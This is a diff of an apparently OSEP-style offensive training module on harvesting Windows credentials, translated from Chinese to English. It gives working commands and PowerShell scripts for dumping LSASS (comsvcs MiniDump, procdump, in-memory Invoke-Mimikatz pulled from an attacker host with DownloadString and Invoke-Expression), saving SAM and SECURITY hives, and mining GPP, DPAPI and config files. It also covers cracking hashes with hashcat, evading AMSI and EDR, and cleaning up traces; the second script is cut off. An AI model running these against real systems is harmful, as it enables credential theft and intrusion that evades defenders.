@@ -2,154 +2,150 @@
 For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
 :::
 
-# Module 07 — Credentials
+# 07 · Credentials: LSASS / LSA / SAM and alternate sources (scenario 46)
 
-If PPL or Credential Guard is on, skip LSASS and take SAM/LSA Secrets/GPP/config files.
+> Aligned with: (`Mimikatz` `LSA Protection Bypass` `MiniDump` `Invoke-Mimikatz` `Cracking Hashes`)
+> Scenario basis: `scenarios.md` scenario 46.
+> Lab files: `m07-invoke-mimikatz-reflect.ps1`, `m07-credential-sources.ps1`
 
-Switch to **中文** in the header for the original full narrative. Lab listings on this page are complete.
+## Module goals
 
-> 对齐：（关键词：`Mimikatz` `LSA Protection Bypass` `MiniDump` `Invoke-Mimikatz` `Cracking Hashes`）
-> 场景依据：`scenarios.md` 场景 46。
-> 脚本：`m07-invoke-mimikatz-reflect.ps1`、`m07-credential-sources.ps1`
+The core judgment for scenario 46: **LSASS access failing ≠ no usable identity**. In similar course situations you can still get another useful identity from
+LSA Secrets, SAM, or application configs. So this module’s prep focus is:
 
-## 模块目标
+1. Decide what is blocking LSASS (LSA Protection / Credential Guard / AV-EDR hooks / insufficient rights),
+   and which cases are **worth trying** LSASS contact versus which should be abandoned immediately.
+2. Build a “credential source × required rights × collection command” lookup table, and try alternates in order.
+3. Prepare multiple **load shapes** for tools (mimikatz / Invoke-Mimikatz / dump utilities) so “tool lands and gets killed” does not become a second roadblock.
 
-场景 46 的核心判断：**LSASS 访问失败 ≠ 拿不到身份**。材料里同类场景都能从
-LSA Secrets、SAM 或应用配置中取得另一种有用身份。因此本模块的准备重心是：
-
-1. 判断 LSASS 到底被什么保护挡住（LSA Protection / Credential Guard / AV-EDR 挂钩 / 权限不足），
-   以及哪些情形**值得尝试**接触 LSASS、哪些情形应当直接放弃。
-2. 建立一张"凭据来源 × 所需权限 × 获取命令"的速查表，按序尝试替代来源。
-3. 准备工具（mimikatz / Invoke-Mimikatz / dump 工具）的多种**加载形态**，避免"工具落地被杀"变成第二道拦路虎。
-
-不变量：**不要假定能绕过 LSASS 保护**。只有确认保护类型与自身权限后再选择手段；
-对 RunAsPPL / Credential Guard，材料中的替代来源路线几乎总是更快。
+Invariant: **do not assume you can bypass LSASS protection**. Choose a method only after you know the protection type and your rights;
+for RunAsPPL / Credential Guard, the alternate-source path in the material is almost always faster.
 
 ---
 
-## Scenario 46：凭据工具被拦，且 LSASS 本身受到保护
+## Scenario 46: Credential tools blocked, and LSASS itself is protected
 
-### Scenario回顾
+### Situation
 
-- 已取得**较高本地权限**（管理员或 SYSTEM），但 LSASS 访问失败（读取被拒 / 工具被杀 / 注入失败）。
-- 目标：从机器上取得**另一种可用身份**（本地或域用户明文/哈希/票据/DPAPI 材料）。
-- 参考路线：先确认 LSASS 保护形态 → 分类尝试替代来源（LSA Secrets、SAM、DPAPI、
-  注册表、配置文件、GPP、计划任务）→ 最后才评估是否有必要与可行的方法接触 LSASS。
+- You already have **high local rights** (admin or SYSTEM), but LSASS access fails (read denied / tool killed / injection fails).
+- Goal: obtain **another usable identity** from the host (local or domain user cleartext / hash / ticket / DPAPI material).
+- Reference path: confirm LSASS protection shape first → try alternate sources by category (LSA Secrets, SAM, DPAPI,
+  registry, config files, GPP, scheduled tasks) → only then evaluate whether contacting LSASS is necessary and feasible.
 
-### 前提与假设
+### Assumptions
 
-- 已有高本地权限会话（能 `reg save` / 读 `HKLM\SECURITY`、`HKLM\SAM`，或运行 SYSTEM 上下文工具）。
-- 假设不成立时的退路：若是低权限且无提权路径，本场景不成立——先做本地枚举，
-  参考 M06 / M12 提权与横向路线，不要浪费时间硬碰 LSASS。
-- 假设杀软/EDR 可能在进程创建、`OpenProcess`、`.dll` 落地、AMSI 各层拦截（场景 19 行为检测思路同样适用）。
+- You already have a high-local-rights session (can `reg save` / read `HKLM\SECURITY`, `HKLM\SAM`, or run tools as SYSTEM).
+- Fallback when the assumption fails: if you are low-priv with no priv-esc path, this scenario does not apply — enumerate locally first,
+  follow M06 / M12 priv-esc and lateral paths; do not waste time slamming LSASS.
+- Assume AV/EDR may block at process create, `OpenProcess`, `.dll` on disk, and AMSI (scenario 19 behavioral ideas still apply).
 
-### 准备（attacker box侧）
+### Prepare (attacker)
 
-- 静态工具：`mimikatz.exe`（x64/x86）、`procdump.exe`、`sekurlsa` 对应驱动（一般不落地）。
-- 内存形态：`Invoke-Mimikatz.ps1`（PowerSploit）与一段反射加载入口——见
-  `m07-invoke-mimikatz-reflect.ps1`（含 comsvcs MiniDump 备选，不依赖下载器）。
-- 来源清单脚本：`m07-credential-sources.ps1`（按来源分类 + 所需权限 + 一键收集）。
-- 离线解析环境：装有 mimikatz / secretsdump / hashcat 的attacker box（把 dump 或 hive 拷回分析）。
-- 目标侧速查命令（不落地任何东西就能先看环境）：
+- Static tools: `mimikatz.exe` (x64/x86), `procdump.exe`, drivers related to `sekurlsa` (usually do not land on disk).
+- In-memory shape: `Invoke-Mimikatz.ps1` (PowerSploit) plus a reflective load entry — see
+  `m07-invoke-mimikatz-reflect.ps1` (includes a comsvcs MiniDump option; no downloader required).
+- Source checklist script: `m07-credential-sources.ps1` (by source + required rights + one-shot collection).
+- Offline parse box: attacker host with mimikatz / secretsdump / hashcat (copy dumps or hives back for analysis).
+- Target-side quick checks (see the environment before landing anything):
 
 ```powershell
-# 当前权限与 SeDebugPrivilege
+# Current rights and SeDebugPrivilege
 whoami /priv
-# LSASS 是否受 RunAsPPL 保护（0 未启用；2=签名+PPL 启动）
+# Whether LSASS is RunAsPPL-protected (0 = off; 2 = signed + PPL start)
 reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL
-reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LsaCfgFlags   # 非 0 提示 Credential Guard 相关
-# LSASS 进程（PID / 完整性）
+reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LsaCfgFlags   # non-zero hints Credential Guard related
+# LSASS process (PID / integrity)
 Get-Process lsass | Select-Object Id, Name
-# 尝试最小接触：确认是"权限被拒"还是"进程被保护"
+# Minimal contact probe: “access denied” vs “process protected”
 tasklist /FI "IMAGENAME eq lsass.exe"
 ```
 
-### 执行步骤
+### Procedure
 
-**第 0 步 · 判型（决定要不要碰 LSASS）**
+**Step 0 · Classify (decide whether to touch LSASS)**
 
-1. `whoami /priv` 无 `SeDebugPrivilege`（且非 SYSTEM）→ 无法常规 dump，直接跳到第 2 步替代来源。
-2. `RunAsPPL` 值为 2 → LSA Protection 开启；`LsaCfgFlags` 非 0 → Credential Guard 方向。
-   两者都不是"一条命令能绕"的配置；**默认放弃 LSASS 直读**，进入替代来源。
-3. 无保护标记但仍失败（被杀/报错）→ 多为 AV/EDR：改加载形态（第 1 步 C/D），而不是换 dump 姿势。
+1. `whoami /priv` has no `SeDebugPrivilege` (and not SYSTEM) → cannot dump normally; jump straight to step 2 alternate sources.
+2. `RunAsPPL` value is 2 → LSA Protection on; `LsaCfgFlags` non-zero → Credential Guard direction.
+   Neither is a “one command bypass” setting; **default: abandon direct LSASS reads**, go to alternate sources.
+3. No protection flags but still failing (killed / errors) → usually AV/EDR: change load shape (step 1 C/D), not dump posture.
 
-**第 1 步 · 仅当无 PPL/Credential Guard 时接触 LSASS（按形态备选）**
+**Step 1 · Contact LSASS only when there is no PPL/Credential Guard (shape options)**
 
-- A. 常规内存执行：mimikatz PE 落地运行或 `Invoke-Mimikatz -Command '"sekurlsa::logonpasswords" "exit"'`
-  （需先把函数载入内存，见脚本反射形态）。
-- B. 官方 dump + 离线分析（留痕最小、最稳）：
+- A. Normal in-memory: land mimikatz PE, or `Invoke-Mimikatz -Command '"sekurlsa::logonpasswords" "exit"'`
+  (load the function into memory first; see the reflective script shape).
+- B. Built-in dump + offline parse (least noisy, most stable):
   `rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Windows\Temp\ls.dmp full`
-  或 `procdump -ma <LSASS_PID> ls.dmp`；拷回attacker box用 mimikatz `sekurlsa::minidump ls.dmp` 离线解析。
-- C. .NET 程序集加载（规避落地 EXE 与部分进程创建检测）：把 mimikatz 作为程序集用
-  `Assembly.Load` + 反射入口执行（配合 `m07-invoke-mimikatz-reflect.ps1` 的 `-Mode Assembly` 占位）。
-- D. 命令行混淆/编码调用（防 AMSI 静态特征），注意场景 18：先编码/加密再投递。
+  or `procdump -ma <LSASS_PID> ls.dmp`; copy back and parse offline with mimikatz `sekurlsa::minidump ls.dmp`.
+- C. .NET assembly load (avoid landed EXE and some process-create detections): treat mimikatz as an assembly via
+  `Assembly.Load` + reflective entry (use `-Mode Assembly` placeholder in `m07-invoke-mimikatz-reflect.ps1`).
+- D. Command-line obfuscation / encoded calls (AMSI static features); remember scenario 18: encode/encrypt before delivery.
 
-> 产物清单：`sekurlsa::logonpasswords`（交互式登录缓存明文/NTLM）、`sekurlsa::wdigest`、
-> `sekurlsa::kerberos`（票据）、`sekurlsa::msv`（msv1_0 缓存）。
+> Artifact list: `sekurlsa::logonpasswords` (interactive logon cache cleartext/NTLM), `sekurlsa::wdigest`,
+> `sekurlsa::kerberos` (tickets), `sekurlsa::msv` (msv1_0 cache).
 
-**第 2 步 · 替代来源（按权限从高到低，优先 SYSTEM 才能读的）**
+**Step 2 · Alternate sources (highest rights first; prefer what only SYSTEM can read)**
 
-用 `m07-credential-sources.ps1` 一键收集，或手工按速查表：
+Use `m07-credential-sources.ps1` for one-shot collection, or follow the lookup table by hand:
 
-| 来源 | 内容 | 所需权限 | 关键命令/位置 |
+| Source | Contents | Rights needed | Key commands / locations |
 |---|---|---|---|
-| LSA Secrets | `DefaultPassword`、服务账户密码、DPAPI 机器密钥 | SYSTEM | `reg save HKLM\SECURITY sec.hive` → secretsdump / mimikatz `lsadump::secrets` |
-| SAM | 本地账户 NTLM 哈希 | SYSTEM | `reg save HKLM\SAM sam.hive` + `HKLM\SYSTEM sys.hive` → `secretsdump -sam -system` |
-| 注册表 Winlogon/AutoLogon | 明文密码 | 管理员 | `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"` |
-| 缓存的域登录 | 域凭据缓存（DCC2） | SYSTEM | `lsadump::cache`（离线破解需 DCC2） |
-| DPAPI | 用户主密钥 + 应用密码（浏览器/Outlook/保险箱） | 对应用户 | 用户目录 `AppData\Roaming\Microsoft\Protect` + 上下文内解密 |
-| WDigest | 明文（旧系统默认开） | SYSTEM | `sekurlsa::wdigest` |
-| 配置文件 | 部署/脚本里的硬编码密码 | 读权限即可 | `unattend.xml`、`web.config`、`*.config`、`*.ps1`/`*.bat`/`*.xml` 全盘搜索 |
-| GPP | 域组策略首选项密码 | 读 SYSVOL（域用户即可） | `SYSVOL\...\Policies\*\MACHINE\Preferences\Groups\Groups.xml` 的 `cPassword` |
-| 计划任务 | 任务动作里引用的凭据/脚本 | 管理员读注册表 | `schtasks /query /fo LIST /v` + `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache` |
+| LSA Secrets | `DefaultPassword`, service account passwords, DPAPI machine keys | SYSTEM | `reg save HKLM\SECURITY sec.hive` → secretsdump / mimikatz `lsadump::secrets` |
+| SAM | Local account NTLM hashes | SYSTEM | `reg save HKLM\SAM sam.hive` + `HKLM\SYSTEM sys.hive` → `secretsdump -sam -system` |
+| Registry Winlogon/AutoLogon | Cleartext password | Admin | `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"` |
+| Cached domain logons | Domain credential cache (DCC2) | SYSTEM | `lsadump::cache` (offline crack needs DCC2) |
+| DPAPI | User master keys + app passwords (browser/Outlook/vault) | Matching user | User profile `AppData\Roaming\Microsoft\Protect` + decrypt in that context |
+| WDigest | Cleartext (on by default on older systems) | SYSTEM | `sekurlsa::wdigest` |
+| Config files | Hardcoded passwords in deploy/scripts | Read rights enough | Full-disk search: `unattend.xml`, `web.config`, `*.config`, `*.ps1`/`*.bat`/`*.xml` |
+| GPP | Domain Group Policy Preferences passwords | Read SYSVOL (domain user enough) | `SYSVOL\...\Policies\*\MACHINE\Preferences\Groups\Groups.xml` `cPassword` |
+| Scheduled tasks | Creds/scripts referenced by task actions | Admin read of registry | `schtasks /query /fo LIST /v` + `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache` |
 
-**第 3 步 · 离线破解（可回attacker box做）**
+**Step 3 · Offline cracking (can be done back on the attacker box)**
 
 ```bash
-# NTLM（SAM/LSA Secrets/sekurlsa 产物）
+# NTLM (SAM / LSA Secrets / sekurlsa artifacts)
 hashcat -m 1000 ntlm.txt wordlist.txt
-# NetNTLMv2（若后续抓到中继哈希，m16/其他场景产物）
+# NetNTLMv2 (if you later capture relay hashes — m16 / other scenario artifacts)
 hashcat -m 5600 netntlmv2.txt wordlist.txt
-# DCC2（缓存域凭据）
+# DCC2 (cached domain credentials)
 hashcat -m 2100 dcc2.txt wordlist.txt
-# 拿到明文/哈希后的使用：见 M15（WinRM 哈希/明文）、M12（PTT/over-pass-the-hash 票据）
+# After cleartext/hash: see M15 (WinRM hash/cleartext), M12 (PTT / over-pass-the-hash tickets)
 ```
 
-### 用到的脚本
+### Lab files
 
-- `m07-invoke-mimikatz-reflect.ps1` —— LSASS 无保护时的加载形态备选
-  （反射执行 / comsvcs MiniDump / 程序集占位）＋ RunAsPPL 与权限预检。
-- `m07-credential-sources.ps1` —— 替代来源一键收集（来源分类 + 所需权限）。
-- 均为"按需取用"而不是自动打全场：先看输出决定下一步。
+- `m07-invoke-mimikatz-reflect.ps1` — load-shape options when LSASS is unprotected
+  (reflective invoke / comsvcs MiniDump / assembly placeholder) plus RunAsPPL and rights pre-checks.
+- `m07-credential-sources.ps1` — one-shot alternate-source collection (by source + required rights).
+- Both are “take what you need”, not auto-fire everything: read the output before choosing the next step.
 
 ### Verify
 
-- 判型结果与现象一致：PPL 开启时预期 `OpenProcess`/dump 被拒；无保护时 dump 能产生非空文件。
-- SAM/LSA Secrets：在attacker box `secretsdump -sam sam.hive -system sys.hive LOCAL`（或对 hive 跑 mimikatz
-  `lsadump::sam /system:sys.hive`）能列出哈希；挑一个 NTLM 用它做一次横向认证（M15）即闭环。
-- LSA Secrets 找到的账户密码：`net use \\TARGET\IPC$ /user:DOMAIN\USER PASS` 或 WinRM 登录Verify。
-- DPAPI/配置文件/GPP：取到的明文能直接认证；GPP 密码用 `gpp-decrypt` 先解 `cPassword`。
+- Classification matches reality: with PPL on, expect `OpenProcess`/dump denied; without protection, dump produces a non-empty file.
+- SAM/LSA Secrets: on the attacker box, `secretsdump -sam sam.hive -system sys.hive LOCAL` (or mimikatz on the hive
+  `lsadump::sam /system:sys.hive`) lists hashes; pick one NTLM and authenticate once laterally (M15) to close the loop.
+- Account passwords from LSA Secrets: `net use \\TARGET\IPC$ /user:DOMAIN\USER PASS` or WinRM login.
+- DPAPI/config/GPP: cleartext authenticates directly; decrypt GPP `cPassword` with `gpp-decrypt` first.
 
-### 失败分支与备选
+### If it fails
 
-1. **LSASS 完全读不到（PPL/Credential Guard）且替代来源也空**：不要滞留。把会话能力转成横向/枚举资产
-   （M12/M15），换一台机器重复来源清单；本模块目标是"另一种身份"，不是必须拿到 LSASS。
-2. **dump 成功但离线解析为空**：用 `sekurlsa::minidump` 版本与 mimikatz 版本匹配（新版系统用新版 mimikatz）；
-   或检查是否误 dump 了非 LSASS 进程、PID 对错（64 位机器用 x64 工具）。
-3. **工具落地被杀 / 进程创建被拦**：改用 comsvcs `MiniDump` 或 .NET 反射形态，避免在目标上写 mimikatz.exe。
-4. **SAM 没本地账户 / LSA Secrets 无可复用密码**：回到配置文件/计划任务/GPP 搜索；域环境优先看 GPP 与
-   计划任务里残留的域凭据。
-5. **拿到的哈希是空密码或已失效**：Verify步骤必须"实际认证一次"；不要在无法认证的哈希上继续破解浪费时间。
+1. **LSASS completely unreadable (PPL/Credential Guard) and alternate sources empty**: do not linger. Convert session capability into lateral/enum
+   (M12/M15), repeat the source list on another host; this module’s goal is “another identity”, not “must get LSASS”.
+2. **Dump succeeds but offline parse is empty**: match `sekurlsa::minidump` / mimikatz versions to the OS (newer hosts need newer mimikatz);
+   or check you did not dump the wrong process / wrong PID (use x64 tools on 64-bit hosts).
+3. **Tool lands and gets killed / process create blocked**: use comsvcs `MiniDump` or .NET reflective shape; avoid writing mimikatz.exe on target.
+4. **SAM has no local accounts / LSA Secrets has no reusable passwords**: return to config/scheduled-task/GPP search; in domain environments prioritize GPP and
+   leftover domain creds in tasks.
+5. **Hash is empty password or already invalid**: verification must “authenticate once for real”; do not keep cracking hashes that cannot authenticate.
 
-### 考试注意 OPSEC
+### Exam notes / OPSEC
 
-- **不要在启用了 LSA Protection / Credential Guard 的机器上反复尝试 dump**：高噪声、大概率失败，还留下
-  EDR 警报。先判型（30 秒），不合适就切替代来源。
-- `reg save` / 大文件拷贝留痕明显：dump 与 hive 用系统目录或已有白名单目录，尽快拷走并清理。
-- mimikatz 与 `Invoke-Mimikatz` 是强静态特征：内存加载形态优先；必要时先编码/加密再投递（场景 18）。
-- 用拿到的身份**实际认证一次**来Verify，但认证失败会锁账户的策略下（如多次尝试域账户密码）要谨慎——
-  优先用哈希做 pass-the-hash（不触发密码策略），而不是盲目猜测明文。
-- 记录每个来源的权限要求，避免用 SYSTEM 之外上下文白跑（本模块脚本已标注所需权限）。
+- **Do not repeatedly try dumps on hosts with LSA Protection / Credential Guard**: high noise, high fail rate, and EDR alerts.
+  Classify first (~30s); if unsuitable, switch to alternate sources.
+- `reg save` / large file copies leave clear traces: keep dumps and hives under system or already-whitelisted dirs; copy off and clean ASAP.
+- mimikatz and `Invoke-Mimikatz` are strong static signatures: prefer in-memory load; encode/encrypt before delivery when needed (scenario 18).
+- **Authenticate once for real** with the identity you got, but be careful under lockout policies (many bad domain password tries) —
+  prefer pass-the-hash (does not hit password policy) over guessing cleartext blindly.
+- Record rights required per source so you do not run blind outside SYSTEM context (lab scripts already annotate required rights).
 
 ---
 
@@ -157,16 +153,16 @@ hashcat -m 2100 dcc2.txt wordlist.txt
 
 ````powershell
 <#
-用途：LSASS 无强保护时的凭据获取——内存加载 Invoke-Mimikatz（不落盘 ps1/exe）或 comsvcs MiniDump 备选
-场景：46（先判型再动手：本脚本只处理"确认可接触 LSASS"的分支；PPL/Credential Guard 开启时按模块结论直接放弃，改用 m07-credential-sources.ps1）
-依赖：PowerShell 3.0+；Invoke 形态需要可读到的 Invoke-Mimikatz.ps1（本地文件或 HTTP 源）；
-      MiniDump 形态需要 SeDebugPrivilege（管理员/SYSTEM）；两者在 RunAsPPL>=2 或 Credential Guard 下都会被拒
-使用：powershell -ep bypass -f m07-invoke-mimikatz-reflect.ps1 -Mode Invoke -SourceFile C:\Windows\Temp\Invoke-Mimikatz.ps1 -Command '"sekurlsa::logonpasswords" "exit"'
-      远程源：... -Mode Invoke -SourceUrl http://LHOST/Invoke-Mimikatz.ps1
-      dump 形态：... -Mode MiniDump -LsassPid 1234 -DumpDir C:\Windows\Temp
-      强制无视判型（一般不推荐）：... -Force
-占位符：LHOST=托管 Invoke-Mimikatz.ps1 的攻击机 IP；SourceFile/SourceUrl 二选一
-测试状态：未在 Windows 实测（本机 macOS）；语法已人工检查。若 AMSI 拦截本脚本/被投递内容，先按场景 18/19（编码/加密、宿主匹配）处理后再投递
+Purpose: Credential collection when LSASS has no strong protection — load Invoke-Mimikatz in memory (no on-disk ps1/exe) or fall back to comsvcs MiniDump
+Scenario: 46 (classify first: this script only handles the “confirmed LSASS is touchable” branch; if PPL/Credential Guard is on, abandon per module guidance and use m07-credential-sources.ps1)
+Depends: PowerShell 3.0+; Invoke mode needs a readable Invoke-Mimikatz.ps1 (local file or HTTP source);
+         MiniDump mode needs SeDebugPrivilege (admin/SYSTEM); both are denied under RunAsPPL>=2 or Credential Guard
+Usage: powershell -ep bypass -f m07-invoke-mimikatz-reflect.ps1 -Mode Invoke -SourceFile C:\Windows\Temp\Invoke-Mimikatz.ps1 -Command '"sekurlsa::logonpasswords" "exit"'
+       Remote source: ... -Mode Invoke -SourceUrl http://LHOST/Invoke-Mimikatz.ps1
+       Dump mode: ... -Mode MiniDump -LsassPid 1234 -DumpDir C:\Windows\Temp
+       Force ignore classification (generally not recommended): ... -Force
+Placeholders: LHOST=attacker IP hosting Invoke-Mimikatz.ps1; SourceFile/SourceUrl choose one
+Test status: Not run on Windows (host is macOS); syntax checked by hand. If AMSI blocks this script/delivered content, handle per scenarios 18/19 (encode/encrypt, host match) before redelivery
 #>
 [CmdletBinding()]
 param(
@@ -186,7 +182,7 @@ function Test-Admin {
     return ($p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -or $id.IsSystem)
 }
 function Get-LsaProtectionStatus {
-    # RunAsPPL: 0=未启用; 1=签名要求; 2=签名+PPL 启动(不可常规 dump)。LsaCfgFlags 非 0 提示 Credential Guard 方向。
+    # RunAsPPL: 0=off; 1=signature required; 2=signature+PPL start (normal dump blocked). Non-zero LsaCfgFlags hints Credential Guard direction.
     $out = [pscustomobject]@{ RunAsPPL = 0; LsaCfgFlags = 0 }
     try {
         $l = (& reg.exe query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL 2>$null)
@@ -197,7 +193,7 @@ function Get-LsaProtectionStatus {
     return $out
 }
 function Enable-SeDebugPrivilege {
-    # 为当前进程打开 SeDebugPrivilege（TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY）
+    # Enable SeDebugPrivilege for the current process (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY)
     if (-not ('M07Priv.Native' -as [type])) {
         Add-Type -TypeDefinition @'
 using System;
@@ -226,50 +222,50 @@ namespace M07Priv {
     return $ok
 }
 
-Section "判型（决定是否值得碰 LSASS）"
+Section "Classify (decide whether LSASS is worth touching)"
 if (-not (Test-Admin)) {
-    Write-Output "[-] 非管理员/SYSTEM：常规无法读 LSASS。建议改用 m07-credential-sources.ps1 走替代来源。"
+    Write-Output "[-] Not admin/SYSTEM: cannot read LSASS normally. Prefer m07-credential-sources.ps1 for alternate sources."
     if (-not $Force) { exit 1 }
 }
 $priv = Enable-SeDebugPrivilege
-Write-Output ("[+] SeDebugPrivilege 可用(已尝试启用)：{0}" -f $priv)
+Write-Output ("[+] SeDebugPrivilege available (enable attempted): {0}" -f $priv)
 $prot = Get-LsaProtectionStatus
-Write-Output ("[+] LSA 保护：RunAsPPL={0} LsaCfgFlags={1}（>=2 表示常规 dump 会被拒）" -f $prot.RunAsPPL, $prot.LsaCfgFlags)
+Write-Output ("[+] LSA protection: RunAsPPL={0} LsaCfgFlags={1} (>=2 means normal dump is denied)" -f $prot.RunAsPPL, $prot.LsaCfgFlags)
 if (($prot.RunAsPPL -ge 2 -or $prot.LsaCfgFlags -ne 0) -and -not $Force) {
-    Write-Output "[-] LSASS 受 LSA Protection / Credential Guard 保护：按模块结论不假定能绕过，转 m07-credential-sources.ps1（SAM/LSA Secrets/注册表/DPAPI/配置文件/GPP/计划任务）。"
+    Write-Output "[-] LSASS protected by LSA Protection / Credential Guard: per module guidance do not assume a bypass — switch to m07-credential-sources.ps1 (SAM/LSA Secrets/registry/DPAPI/config/GPP/scheduled tasks)."
     exit 2
 }
 
 if ($Mode -eq 'Invoke') {
-    Section "Invoke-Mimikatz（内存反射，不落盘）"
+    Section "Invoke-Mimikatz (in-memory reflection, no disk)"
     $src = ''
     if ($SourceFile -ne '') { $src = Get-Content -Raw -LiteralPath $SourceFile -ErrorAction Stop }
     elseif ($SourceUrl -ne '') {
-        Write-Output "[*] 从 $SourceUrl 拉取（代理/出网见 docs/09）..."
+        Write-Output "[*] Pulling from $SourceUrl (proxy/egress: see docs/09)..."
         $src = (New-Object System.Net.WebClient).DownloadString($SourceUrl)
-    } else { Write-Output "[-] Invoke 形态需要 -SourceFile 或 -SourceUrl（Invoke-Mimikatz.ps1 本体过大不宜内嵌）"; exit 3 }
+    } else { Write-Output "[-] Invoke mode needs -SourceFile or -SourceUrl (Invoke-Mimikatz.ps1 is too large to embed)"; exit 3 }
     Invoke-Expression $src
     if (-not (Get-Command Invoke-Mimikatz -ErrorAction SilentlyContinue)) {
-        Write-Output "[-] 函数 Invoke-Mimikatz 未成功载入（可能被 AMSI/语言模式拦截，按场景 18/19 处理后重试）"; exit 4
+        Write-Output "[-] Function Invoke-Mimikatz failed to load (AMSI/language mode may have blocked it — retry after scenarios 18/19)"; exit 4
     }
-    Write-Output "[*] 执行：$Command"
+    Write-Output "[*] Running: $Command"
     & (Get-Command Invoke-Mimikatz) -Command $Command
-    Write-Output "[*] 完成。输出含 logonpasswords 缓存时，用其中身份做实际认证验证（M15/M12）。"
+    Write-Output "[*] Done. If output includes logonpasswords cache, authenticate for real with that identity (M15/M12)."
 }
 else {
-    Section "MiniDump（comsvcs.dll，产物离线解析）"
+    Section "MiniDump (comsvcs.dll, parse offline)"
     $ls = if ($LsassPid -gt 0) { Get-Process -Id $LsassPid -ErrorAction Stop } else { Get-Process lsass -ErrorAction Stop }
     $stamp = Get-Date -Format 'yyyyMMdd_HHmmss'
     $out = Join-Path $DumpDir ("lsass_{0}_{1}.dmp" -f $ls.Id, $stamp)
     Write-Output "[*] dump LSASS PID=$($ls.Id) -> $out"
-    # 直接 rundll32 comsvcs MiniDump；被 PPL 挡住时进程会失败/文件为空，属预期（见判型）
+    # Direct rundll32 comsvcs MiniDump; under PPL the process fails / file is empty — expected (see classify)
     & rundll32.exe "$env:WINDIR\System32\comsvcs.dll, MiniDump" $ls.Id $out "full"
     Start-Sleep -Seconds 2
     if ((Test-Path $out) -and ((Get-Item $out).Length -gt 0)) {
-        Write-Output "[+] dump 成功：$out ($((Get-Item $out).Length) bytes)"
-        Write-Output "[*] 拷贝回攻击机离线解析：mimikatz.exe \"sekurlsa::minidump $out\" \"sekurlsa::logonpasswords\" \"exit\""
+        Write-Output "[+] dump OK: $out ($((Get-Item $out).Length) bytes)"
+        Write-Output "[*] Copy back for offline parse: mimikatz.exe `"sekurlsa::minidump $out`" `"sekurlsa::logonpasswords`" `"exit`""
     } else {
-        Write-Output "[-] dump 失败/为空：确认 SeDebugPrivilege、未开 PPL、PID 正确；或换 -Mode Invoke 形态"
+        Write-Output "[-] dump failed/empty: confirm SeDebugPrivilege, PPL off, correct PID; or switch to -Mode Invoke"
     }
 }
 ````
@@ -278,20 +274,20 @@ else {
 
 ````powershell
 <#
-用途：按"凭据来源"分类收集 Windows 凭据材料（SAM / LSA Secrets / 注册表 AutoLogon / 缓存登录 / DPAPI / 配置文件 / 计划任务 / GPP），每种标注所需权限与产物，供离线解析
-场景：46 —— LSASS 受保护或凭据工具被拦时改走替代来源；拿到高权限（尤其 SYSTEM）后把机器上身份材料一次扫清
-依赖：管理员可覆盖大部分；SAM、LSA Secrets、缓存登录需 SYSTEM；DPAPI 需对应用户会话；GPP 需域身份且 SYSVOL 可达
-使用：powershell -ep bypass -f m07-credential-sources.ps1 -WorkDir C:\Windows\Temp
-      最大化覆盖（建议）：以 SYSTEM 运行本脚本（PsExec -s / schtasks /create /ru SYSTEM /run，参考 M06/M27 思路）
-      GPP 检索需带域：... -Domain corp.local
-占位符：DOMAIN=目标域 FQDN（SYSVOL 路径）；WorkDir=产物保存目录（需可写，建议系统目录）
-测试状态：未在 Windows 实测（本机 macOS）；语法已人工检查。reg save 的 hive 与 Groups.xml 均带回攻击机离线解析，不在目标上破解
+Purpose: Collect Windows credential material by source (SAM / LSA Secrets / registry AutoLogon / cached logons / DPAPI / config files / scheduled tasks / GPP), annotate required rights and artifacts for offline parse
+Scenario: 46 — when LSASS is protected or credential tools are blocked, switch to alternate sources; after high rights (especially SYSTEM), sweep host identity material once
+Depends: Admin covers most; SAM, LSA Secrets, cached logons need SYSTEM; DPAPI needs matching user session; GPP needs domain identity with SYSVOL reachability
+Usage: powershell -ep bypass -f m07-credential-sources.ps1 -WorkDir C:\Windows\Temp
+       Max coverage (recommended): run as SYSTEM (PsExec -s / schtasks /create /ru SYSTEM /run — see M06/M27 ideas)
+       GPP search needs domain: ... -Domain corp.local
+Placeholders: DOMAIN=target domain FQDN (SYSVOL path); WorkDir=artifact directory (must be writable; prefer system dirs)
+Test status: Not run on Windows (host is macOS); syntax checked by hand. Take reg-save hives and Groups.xml back to the attacker box for offline parse — do not crack on the target
 #>
 [CmdletBinding()]
 param(
     [string]$WorkDir = "$env:WINDIR\Temp\m07creds",
-    [string]$Domain = '',          # 例如 corp.local；非空才做 GPP(SYSVOL) 检索
-    [switch]$SkipConfigScan        # 配置文件全盘类扫描较吵，可跳过
+    [string]$Domain = '',          # e.g. corp.local; non-empty enables GPP (SYSVOL) search
+    [switch]$SkipConfigScan        # full-disk-ish config scans are noisy; can skip
 )
 
 function Section($t) { Write-Output ""; Write-Output ("=" * 12 + " $t " + "=" * 12) }
@@ -308,84 +304,84 @@ function Test-Admin {
 New-Item -ItemType Directory -Force -Path $WorkDir | Out-Null
 $Sys  = (whoami) -match 'nt authority\\system'
 $Admin = Test-Admin
-Write-Output "[*] 上下文：$(whoami) | 管理员=$Admin | SYSTEM=$Sys | 产物目录=$WorkDir"
-Write-Output "[*] 权限图例：SYSTEM > 管理员 > 当前用户 > 读权限即可。本脚本只收集不破解；hive/Groups.xml 回攻击机离线处理。"
+Write-Output "[*] Context: $(whoami) | Admin=$Admin | SYSTEM=$Sys | Artifact dir=$WorkDir"
+Write-Output "[*] Rights legend: SYSTEM > Admin > current user > read-only enough. This script only collects; parse hive/Groups.xml offline on the attacker box."
 
-Section "1. SAM（本地账户 NTLM）— 需 SYSTEM"
+Section "1. SAM (local account NTLM) — needs SYSTEM"
 if ($Sys) {
